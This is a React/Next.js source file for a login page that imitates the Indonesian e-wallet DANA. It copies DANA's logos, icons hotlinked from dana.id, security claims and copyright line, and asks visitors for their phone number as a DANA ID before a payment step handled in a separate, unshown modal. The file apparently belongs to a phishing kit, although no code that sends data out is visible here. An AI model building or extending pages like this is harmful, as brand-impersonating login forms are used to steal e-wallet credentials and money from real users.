"use client";

import Image from "next/image";
import React, { Children, useEffect, useState } from "react";
import { FaCircleQuestion } from "react-icons/fa6";
import logoDana from "@/lib/images/logoDana.png";
import danaProtection from "@/lib/images/danaProtection.png";
import Dana from "@/lib/images/Dana.png";
import dompetDigital from "@/lib/images/dompetDigital.png";
import merchantDana from "@/lib/images/merchantDana.png";
import safeDana from "@/lib/images/safeDana.png";
import danaProtect from "@/lib/images/danaProtect.png";
import helpBackground from "@/lib/images/helpBackground.png";
import ModalComponent from "@/components/Login/ModalComponent";
import danaPicture from "@/lib/images/danaPicture.png";
import { MdOutlineWatchLater } from "react-icons/md";
import { FaUnlockAlt } from "react-icons/fa";
import { SlInfo } from "react-icons/sl";
import ModalEnter from "@/components/Login/ModalEnter";

const ImagesVerifikasi = [
  {
    url: "https://a.m.dana.id/resource/icons/icon-new-card.svg",
    titleSpan: "Dompet digital untuk kamu",
    titleParagraf:
      "Simpan uang serta kartu debit/kredit dengan praktis di DANA",
  },
  {
    url: "https://a.m.dana.id/resource/icons/icon-proceed-trx.svg",
    titleSpan: "Bayar apa pun jadi mudah",
    titleParagraf:
      "Belanja di merchant? Tinggal scan QRIS. Mau bayar online? Tinggal kirim uang!",
  },
  {
    url: "https://a.m.dana.id/resource/icons/icon-trusted-device.svg",
    titleSpan: "Selalu aman dengan DANA!",
    titleParagraf:
      "DANA Protection menjaga uang sekaligus datamu lengkap dengan kode PIN agar selalu aman.",
  },
];

const Login = () => {
  const [active, setActive] = useState(false);
  const [ModalEnterState, setModalEnterState] = useState(false);
  const [nomor, setNomor] = useState("");
  const [isDisabled, setIsDisabled] = useState(true);
  const [error, setError] = useState("");

  const handleChangeInput = (event: React.ChangeEvent<HTMLInputElement>) => {
    setNomor(event.target.value);

    setIsDisabled(!nomor.startsWith("8") || nomor === "" || nomor.length < 10);

    if (isDisabled) {
      setError("Format nomor HP anda salah. Coba lagi ya.");
    }
  };

  const handleClick = () => {
    setModalEnterState(true);
  };

  return (
    <div className=" w-full justify-center">
      <div className="bg-blue-500 md:flex md:p-5 md:shadow-lg md:relative md:justify-between">
        <Image
          src={logoDana}
          width={120}
          height={120}
          alt="/"
          className="mx-auto md:ml-0"
        />
        <div className="hidden md:flex">
          <Image src={danaProtection} alt="/" height={140} width={140} />
        </div>
      </div>
      <div className="bg-blue-500 h-52 md:h-72 w-full"></div>
      <div className="md:flex flex-row justify-center">
        <div className="hidden md:relative md:flex mx-3 flex-col -top-32 md:-top-44 h-60 max-w-[420px] bg-slate-50 p-5 rounded-xl shadow-lg ">
          <div className="flex gap-5 mb-10">
            <div className="h-10 w-10">
              <Image src={danaPicture} alt="/" />
            </div>
            <div className="flex flex-col">
              <p>Langkah 1</p>
              <strong>Masukan Nomor HP</strong>
              <p className="text-orange-500 flex gap-2 text-xs">
                <MdOutlineWatchLater size={15} color="orange" /> BERLANGSUNG
              </p>
            </div>
          </div>
          <div className="flex flex-row gap-5">
            <div className="bg-slate-300 my-auto rounded-full p-2">
              <FaUnlockAlt size={25} color="orange" />
            </div>
            <div className="flex flex-col">
              <p>Langkah 2</p>
              <strong>Lanjutkan Pembayaran</strong>
            </div>
          </div>
        </div>
        <div>
          <div className="relative mx-3 -top-32 md:-top-44 bg-slate-50 border p-5 lg:max-w-[420px] rounded-xl shadow-lg">
            <div>
              <Image
                src={Dana}
                width={150}
                height={150}
                alt="/"
                className="mx-auto"
              />
              <hr className="border-b-slate-300 mt-5 lg:mt-3" />
              <div className="my-5 lg:my-3 py-5 w-full">
                <label htmlFor="telNo" className="font-bold text-sm">
                  Masukan nomor HP sebagai ID DANA
                </label>
                <div className="border flex gap-2 items-center rounded-md ">
                  <p className="border-r px-3">&#x1F1EE;&#x1F1E9;</p>
                  <p>+62</p>
                  <form>
                    <input
                      onChange={handleChangeInput}
                      name="tel"
                      type="tel"
                      value={nomor}
                      maxLength={12}
                      placeholder="1234567890"
                      className="border-none outline-none py-2 w-full bg-slate-50"
                    />
                  </form>
                </div>
                {error && (
                  <p className="text-sm text-red-500 mt-3 flex items-center">
                    <SlInfo size={15} color="red" className="mr-2" />
                    {error}
                  </p>
                )}
              </div>
              <strong className="mt-5">
                Berbagai kemudahan bisa kamu dapatkan di DANA!
              </strong>
              <div className="grid grid-row-3 w-full mt-5">
                {ImagesVerifikasi.map((item, index) => {
                  return (
                    <div key={index} className="flex gap-1 m-2">
                      <div className="mr-3 max-h-12 max-w-12">
                        <Image src={item.url} height={50} width={50} alt="/" />
                      </div>
                      <div className="flex flex-col">
                        <strong className="text-wrap">{item.titleSpan}</strong>
                        <p className="text-xs flex text-wrap">
                          {item.titleParagraf}
                        </p>
                      </div>
                    </div>
                  );
                })}
              </div>
              <hr className="max-[767px]:hidden md:border-b-slate-900 my-2" />
              <div className="max-[767px]:hidden w-full">
                <p className="text-xs text-center text-slate-400">
                  Keamanan datamu dilindungi oleh DANA Protection
                </p>
                <button
                  disabled={isDisabled || nomor.length < 10}
                  onClick={handleClick}
                  className="w-full py-3 font-bold bg-blue-500 text-white rounded-md my-3 disabled:bg-slate-300"
                >
                  LANJUTKAN
                </button>
                <ModalEnter
                  open={ModalEnterState}
                  onClose={() => setModalEnterState(false)}
                ></ModalEnter>
                <div className="flex items-center justify-between">
                  <div className="flex">
                    <p className="text-slate-400 flex text-xs">Secured by</p>
                    <Image src={danaProtect} alt="/" className="h-4 w-4 mx-2" />
                    <p className="text-xs text-slate-400 font-bold">
                      DANA PROTECTION
                    </p>
                  </div>
                  <button
                    type="submit"
                    className="text-blue-500 flex px-2 py-1 border ease-in duration-200 border-blue-500 gap-2 rounded-md font-bold
                    $"
                  >
                    BANTUAN
                    <FaCircleQuestion size={15} className="mt-1" />
                  </button>
                  <ModalComponent
                    open={active}
                    onClose={() => setActive(false)}
                  ></ModalComponent>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="fixed md:hidden lg:hidden bottom-0 w-full">
        <div className="bg-slate-100 p-3">
          <p className="text-xs text-center text-slate-400">
            Keamanan datamu dilindungi oleh DANA Protection
          </p>
          <button
            disabled={isDisabled}
            onClick={() => setModalEnterState(true)}
            className="w-full bg-blue-500 py-3 font-bold text-white rounded-md my-3
            disabled:bg-slate-300"
          >
            LANJUTKAN
          </button>
          <ModalEnter
            open={ModalEnterState}
            onClose={() => setModalEnterState(false)}
          ></ModalEnter>
          <div className="flex items-center justify-between">
            <div className="flex">
              <p className="text-slate-400 flex text-xs">Secured by</p>
              <Image src={danaProtect} alt="/" className="h-4 w-4 mx-2" />
              <p className="text-xs text-slate-400 font-bold">
                DANA PROTECTION
              </p>
            </div>
            <button
              onClick={() => setModalEnterState(true)}
              className="text-blue-500 flex px-2 py-1 border ease-in duration-200 border-blue-500 gap-2 rounded-md font-bold"
            >
              BANTUAN
              <FaCircleQuestion size={15} className="mt-1" />
            </button>
            <ModalComponent
              open={active}
              onClose={() => setActive(false)}
            ></ModalComponent>
          </div>
        </div>
      </div>
      <div className="hidden md:flex md:flex-col w-full max-h-[450px] px-40 py-5 bg-blue-500">
        <div>
          <Image src={logoDana} alt="/" height={140} width={140} />
        </div>
        <div className="text-wrap text-sm text-white my-5 lg:flex lg:flex-row lg:gap-3">
          <div className="my-5">
            <strong>GARANSI UANG KEMBALI</strong>
            <p>
              Dana Protection menjamin keamanan transaksi dari datamu dengan
              garansi uang kembali.
            </p>
          </div>
          <div className="my-5">
            <strong>KEAMANAN KELAS DUNIA</strong>
            <p>
              Sistem keamanan DANA memenuhi standart PCI-DSS dan ISCI
              terverifikasi oleh Bank Indonesia.
            </p>
          </div>
          <div className="my-5">
            <strong>HIDUP #BEBASDRAMA</strong>
            <p>
              Nikmati mudahnya pembayaran digital yang mengerti apa yang kamu
              mau dan butuhkan.
            </p>
          </div>
        </div>
        <div className="text-white text-sm my-5">
          <p>© 2018 DANA-PT Espay Debit Indonesia Koe. All Rights Reserved.</p>
        </div>
      </div>
    </div>
  );
};

export default Login;
